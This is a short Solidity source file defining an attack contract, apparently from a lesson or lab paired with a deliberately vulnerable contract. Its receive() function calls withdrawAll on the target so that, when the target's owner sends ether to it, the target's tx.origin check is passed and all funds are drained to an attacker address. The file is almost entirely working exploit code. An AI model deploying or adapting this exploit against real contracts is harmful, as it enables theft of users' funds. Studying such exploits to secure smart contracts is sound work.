// SPDX-License-Identifier: MIT

pragma solidity ^0.8.20;

import "./TxOriginVulnerable.sol";

contract AttackContract {
    Vulnerable vulnerableContract;
    address payable attacker;

    constructor(Vulnerable _vulnerableaddress,address payable _attacker){
        vulnerableContract = _vulnerableaddress;
        attacker = _attacker;
    }

    receive() external payable{
        vulnerableContract.withdrawAll(attacker);
    }
}